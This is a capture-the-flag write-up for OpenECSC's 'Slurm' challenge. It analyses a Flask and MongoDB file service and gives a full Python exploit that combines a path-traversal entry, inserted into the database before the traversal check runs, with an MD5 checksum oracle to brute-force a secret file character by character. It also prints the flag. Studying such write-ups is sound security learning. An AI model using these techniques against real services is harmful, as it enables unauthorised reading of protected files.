Slurm
OpenECSC Final Round 204
Val
# Introduction

The challenge consists in a basic file upload functionality, as well as having some uploaded files of its own, it uses MongoDB to keep track of which files exist and where and it also has the functionality to get the checksum of a specific file to verify the integrity of it.

![alt text](images/20240921-openecsc-final-round-slurm/slurm.png)

# Source Code Analysis

After checking out the app source code, we see that the flag is stored inside the file `secretrecipe.txt` having `ea41c85c-3db0-4ded-aff1-a93994f64d81` as its file id.

```python
files = [
    {
        "metadata": {
            "author": "Slurm Mckenzie",
            "filename": "whytodrinkslurm.txt",
            "description": "Discover why to drink our awesome slurm",
            "id": "e7bfd133-9fe0-4b9b-94bc-2857f92bd13b",
        },
        "content": "The most addictive drink ever!",
    },
    {
        "metadata": {
            "author": "Slurm Mckenzie",
            "filename": "aboutingredients.txt",
            "description": "Some good news about our ingredients",
            "id": "1e8f1948-4f3b-4a33-8be6-e6938efdfabc",
        },
        "content": "Bio ingredients, all natural stuffs.",
    },
    {
        "metadata": {
            "author": "Slurm Mckenzie",
            "filename": "healthydrink.txt",
            "description": "Our drink is healty",
            "id": "50fca9e8-2619-43b8-b84b-a555bf48e2c5",
        },
        "content": "Refill your energy and take care about your weight and your health with slurm!",
    },
    {
        "metadata": {
            "author": "Slurm Queen",
            "filename": "secretrecipe.txt",
            "description": "Super secret recipe",
            "id": "ea41c85c-3db0-4ded-aff1-a93994f64d81",
        },
        "content": os.getenv("FLAG"),
    },
]
```

We also see that making a GET request to `/files` only returns the files' metadata and if we try to get the content of a file, it first checks whether the id is the `secretrecipe.txt` file id, in which case it returns 403, otherwise it queries the database searching for the file id we asked for and if it exists the app creates a strange `FileMetadata` object with the query's result fields.

We can also see that if `secretrecipe.txt` is in our result's filename field, and if it is, it also restricts us from viewing the file's contents, keep this in mind for later.

```python
@app.get("/files")
def get_files():
    return [f["metadata"] for f in files]


@app.get("/files/<id>")
def get_file(id):
    if id == "ea41c85c-3db0-4ded-aff1-a93994f64d81":
        return "", 403
    res = metadata.find_one({
        "id": {"$eq": id}
    })
    if res is None:
        return "", 404
    m = FileMetadata(
        res["author"],
        res["filename"],
        res["description"],
        id=res["id"],
    )
    if files[-1]["metadata"]["filename"] in res["filename"]:
        return "", 403
    return m.read(int(request.args.get("offset", 0)))
```

Let's see what this `FileMetadata` class is:

```python
class FileMetadata:
    def __init__(
            self,
            author,
            filename,
            description,
            id = None,
    ):
        if len(author) > 50 or \
           len(filename) > 50 or \
           len(description) > 150:
            raise StringTooLongException()
        self.creation_time = datetime.now(tz=timezone.utc)

        self.author = author
        self.filename = filename
        self.init = id in forbidden_ids
        basedir = "/company" if self.init else "/tmp"
        self.path = f"{basedir}/{filename}"
        self.description = description
        self.id = str(UUID(id, version=4)) if id is not None else str(uuid4())

    def write(self, collection, content):
        if self.id in forbidden_ids and not self.init:
            raise ValueError("Use of forbidden id")

        collection.insert_one(vars(self))

        if "./" in self.path:
            raise PathTraversalAttemptDetectedException()
        if len(content) > 200:
            raise FileTooBigException()
        with open(self.path, "w") as f:
            f.write(content)

    def read(self, offset):
        with open(self.path) as f:
            f.seek(offset)
            return f.read()
```

Ok so we can see it's a wrapper class to write and read files. It gets initialized with an author, a filename, a description and an id if one is supplied. Then it checks if the supplied id is in the forbidden ids, which are the files created at the start of the app (including `secretrecipe.txt`), and if it is it sets the `self.init`, which sets the `basedir` to be `/company` rather than `/tmp`. So this tells us all of the default files are located at `/company` while all the files we upload are in `/tmp`.

Looking at the write function we see that if either the FileMetadata object was created initially with a forbidden id or it has a forbidden id it will throw an error, so we cannot overwrite the default files. After this check the app then adds our FileMetadata object to the database and then checks if the `self.filename` field contains `./` in which case it throws an error, same as if the `content` parameter is longer than 200. After all these checks it finally writes our content in the file at `self.path`.

The read function opens the file at `self.path` and then reads its contents beginning at a certain offset, which is interesting.

Let's see how the application handles file uploads:

```python
@app.post("/files")
def post_file():
    body = request.json
    try:
        parsed_body = parse_file(body)
    except (KeyError, ValueError):
        return "", 422
    ...
```

Ok so it takes our request.json and tries to parse it in the `parse_file` method

```python
def parse_file(body, id=None):
    import re, string
    CONTENT_CHECK = re.compile(f"[^ {string.ascii_letters}]")

    if CONTENT_CHECK.search(body["content"]):
        raise ValueError()
    if len(body["content"]) > 200:
        raise ValueError()

    return {
        "metadata": FileMetadata(
            body["author"],
            body["filename"],
            body["description"],
            id,
        ),
        "content": body["content"]
    }
```

which returns a FileMetadata object initialized with our request's author,filename and description, an id which is None if not provided and `body["content"]`. There are a couple of checks that make sure the file's content only contain letters and doesn't contain more than 200 characters, so no weird shenanigans here.

Coming back to the upload functionality, after parsing our request the app uses the FileMetadata write method on the object created by parse_file and then redirects us to the location of the newly created file.

```python
@app.post("/files")
def post_file():
    body = request.json
    try:
        parsed_body = parse_file(body)
    except (KeyError, ValueError):
        return "", 422
    m = parsed_body["metadata"]
    content = parsed_body["content"]
    m.write(metadata, content)
    r = make_response("", 201)
    r.headers["Location"] = f"/api/v1/files/{m.id}"
    return r
```

# How to read secretrecipe.txt

Initially I didn't know how to go on about reading the contents of `secretrecipe.txt`, almost all endpoints have checks for the file id, you can't upload stuff like php and get RCE nor is there a bot to XSS on. Then I started thinking backwards, because even if I managed to get a file handler that points to `/company/secretrecipe.txt`, I couldn't read its contents normally due to this check

```python
if files[-1]["metadata"]["filename"] in res["filename"]:
        return "", 403
```

But then, looking at this endpoint I remembered that this doesn't contain the same check as above, so it could prove to be useful.

```python
@app.get("/files/<id>/checksum")
def get_file_integrity(id):
    if id == "ea41c85c-3db0-4ded-aff1-a93994f64d81":
        return "", 403
    res = metadata.find_one({
        "id": {"$eq": id}
    })
    if res is None:
        return "", 404
    m = FileMetadata(
        res["author"],
        res["filename"],
        res["description"],
        id=res["id"],
    )
    content = m.read(int(request.args.get("offset", 0)))
    return {"checksum": hashlib.md5(content.encode()).hexdigest()}
```

Here the app queries the db for the supplied id and if it exists it creates a FileMetadata object and reads its content beginning at `offset` which we provide through the GET parameters. Then the app returns the md5 hash of the content.

This instantly reminded me of a XSLeak technique of bruteforcing each character by making a query to an oracle endpoint: if we set `offset` to be more than the length of the file, `content` will be an empty string and the returned MD5 hash will be `d41d8cd98f00b204e9800998ecf8427e`. 

Using this knowledge we can bruteforce each character by starting the offset at a high number and going backwards, slowly constructing the content letter by letter until we reach 0:

```python
for letter in ALPHABET:
    content = letter + content
    tent = hashlib.md5(content.encode()).hexdigest()
    if tent==response['checksum']:
        print(content)
        break
    content = content[1:]
```

So we have a way to read the contents of `secretrecipe.txt`, the only problem is getting a FileMetadata object with an id that's not one of the forbidden ids and having filename equal to `/company/secretrecipe.txt`


# Getting a handler to /company/secretrecipe.txt

The next question is, how do we get a handler to the secret file? 
The only way we have to create a FileMetadata object and adding it to the db is through the POST request to `/api/v1/files` or the PUT request to `/api/v1/files/<id>`, which creates our handler and calls the FileMetadata write function. So even if we manage to bypass the checks and upload a file with a filename like `../company/secretrecipe.txt`, the app would overwrite the contents of `secretrecipe.txt` and we don't want that. So we have to create an entry in the db having an id not in the forbidden ids, having the filename equal to the path to `secretrecipe.txt` while also not writing to it... Is it possible?

As it turns out, the answer is yes! Looking again at the FileMetadata write function 

```python
def write(self, collection, content):
        if self.id in forbidden_ids and not self.init:
            raise ValueError("Use of forbidden id")

        collection.insert_one(vars(self))

        if "./" in self.path:
            raise PathTraversalAttemptDetectedException()
        if len(content) > 200:
            raise FileTooBigException()
        with open(self.path, "w") as f:
            f.write(content)
```

we can see that the app adds our file to the db _before_ the checks, enabling us to create an entry in the db even if it contains `./` in `self.path`, and most importantly it does not continue with the writing of the file since the application will throw an error.

# Putting it all together

Using all of the knowledge we acquired we can exploit this challenge. We make a PUT request to `/api/v1/files/{random_uid}` with filename `../company/secretrecipe.txt`, and we should get a 500 Internal Server Error, then we bruteforce the file's content through the `/api/v1/{same_random_uid}/checksum?offset=` starting the offset at a reasonably high value and going down to 0.

It works! And we get the flag `openECSC{B377eR_7o_nO7_kNow_7h3_Tru7H_c15eb4b5}`

Here's the exploit:

```python
import requests
import hashlib
import string
import json

def put_file():
    URL = "http://slurm.challs.open.ecsc2024.it/api/v1/files/ef411dab-8b8d-45a1-9de4-a9614d533999" #../company/secretrecipe.txt

    response = requests.put(URL,json={"author":"Valeryum999","filename":"../company/secretrecipe.txt","content":"ez","description":"lmao"})
    print(response)
    print(response.text)

def bruteforce(id):
    ALPHABET = string.ascii_letters + "0123456789_-!{}()?"
    content = ""
    for number in range(50,-1,-1):
        URL = f"http://slurm.challs.open.ecsc2024.it/api/v1/files/{id}/checksum?offset={number}"
        response = requests.get(URL)
        print(response.text)
        response = json.loads(response.text)
        if response['checksum']=="":
            continue
        print(response)
        for letter in ALPHABET:
            content = letter + content
            tent = hashlib.md5(content.encode()).hexdigest()
            print("[+] Try:",content)
            if tent==response['checksum']:
                print(content)
                break
            content = content[1:]

put_file()
bruteforce("ef411dab-8b8d-45a1-9de4-a9614d533999")
```